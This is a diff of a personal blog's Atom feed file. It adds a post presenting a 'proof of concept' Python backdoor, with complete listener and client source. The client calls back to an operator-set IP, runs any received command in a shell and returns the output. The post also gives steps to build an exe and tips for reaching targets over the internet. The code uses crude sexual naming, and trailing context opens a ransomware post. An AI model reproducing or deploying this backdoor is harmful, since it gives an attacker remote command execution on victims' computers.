@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-11T11:15:42+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Published an NPM Package</title><link href="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package.html" rel="alternate" type="text/html" title="Published an NPM Package" /><published>2020-09-11T06:00:00+08:00</published><updated>2020-09-11T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/09/11/Published-an-NPM-package</id><content type="html" xml:base="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package.html">&lt;h3 id=&quot;issue&quot;&gt;Issue:&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-13T02:29:37+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Published an NPM Package</title><link href="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package-copy.html" rel="alternate" type="text/html" title="Published an NPM Package" /><published>2020-09-11T06:00:00+08:00</published><updated>2020-09-11T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/09/11/Published-an-NPM-package%20copy</id><content type="html" xml:base="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package-copy.html">&lt;h3 id=&quot;issue&quot;&gt;Issue:&lt;/h3&gt;
 &lt;p&gt;I can’t use normal javascript windows.sessionStorage or localStorage in nodejs.&lt;/p&gt;
 
 &lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
@@ -9,7 +9,88 @@
 
 &lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/package/sessionstorage-for-nodejs&quot;&gt;NPM Package&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">Issue: I can’t use normal javascript windows.sessionStorage or localStorage in nodejs.</summary></entry><entry><title type="html">Ransomware Proof of concept</title><link href="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html" rel="alternate" type="text/html" title="Ransomware Proof of concept" /><published>2020-08-29T06:00:00+08:00</published><updated>2020-08-29T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware</id><content type="html" xml:base="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html">&lt;h3 id=&quot;ransomware-concept&quot;&gt;Ransomware Concept&lt;/h3&gt;
+&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">Issue: I can’t use normal javascript windows.sessionStorage or localStorage in nodejs.</summary></entry><entry><title type="html">Proof of Concept Python Backdoor</title><link href="http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor.html" rel="alternate" type="text/html" title="Proof of Concept Python Backdoor" /><published>2020-09-11T06:00:00+08:00</published><updated>2020-09-11T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor</id><content type="html" xml:base="http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor.html">&lt;h1 id=&quot;goatse&quot;&gt;goatse&lt;/h1&gt;
+&lt;p&gt;a proof of concept backdoor for the most bare-bone access&lt;/p&gt;
+
+&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
+&lt;p&gt;Run the server.py on your computer to start listening for callbacks.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;775 server.py
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./server.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;3 ways you can start goatse to target computer&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;run as python script
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;775 goatse.py
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./goatse.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;create an exe file using pyinstaller, exe file is located in dist folder
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ pyinstaller --onefile goatse.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;/h2&gt;
+&lt;p&gt;server.py&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#import socket API module
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# for LAN you can use your pc's ip.
+# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc's ip address.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'192.168.1.1'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Server is online'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Listening for callback'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#listening for callback
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#will display once callback is initiated
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f'[+] &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; She spreads the legs, it is time'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;goatse.py&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#import socket and subprocess modules, subprocess module allows us to run commands on our target machine.
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;#don't forget to set the correct server ip address and port in order for this to callback home.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'192.168.1.1'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#after successfull callback to home, goatse will start to listen for commands from server
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;#this decodes the user command from sent from server
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;#then executes command and read the output/error
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;output_error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;license&quot;&gt;License&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://choosealicense.com/licenses/bsd-3-clause/&quot;&gt;BSD 3-Clause “New” or “Revised” License&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/AdrianDucao/goatse&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">goatse a proof of concept backdoor for the most bare-bone access</summary></entry><entry><title type="html">Ransomware Proof of concept</title><link href="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html" rel="alternate" type="text/html" title="Ransomware Proof of concept" /><published>2020-08-29T06:00:00+08:00</published><updated>2020-08-29T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware</id><content type="html" xml:base="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html">&lt;h3 id=&quot;ransomware-concept&quot;&gt;Ransomware Concept&lt;/h3&gt;
 &lt;p&gt;The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here &lt;a href=&quot;https://github.com/AdrianDucao/run-some-crypt&quot;&gt;run-some-crypt&lt;/a&gt;.&lt;/p&gt;
 
 &lt;h4 id=&quot;content&quot;&gt;Content&lt;/h4&gt;
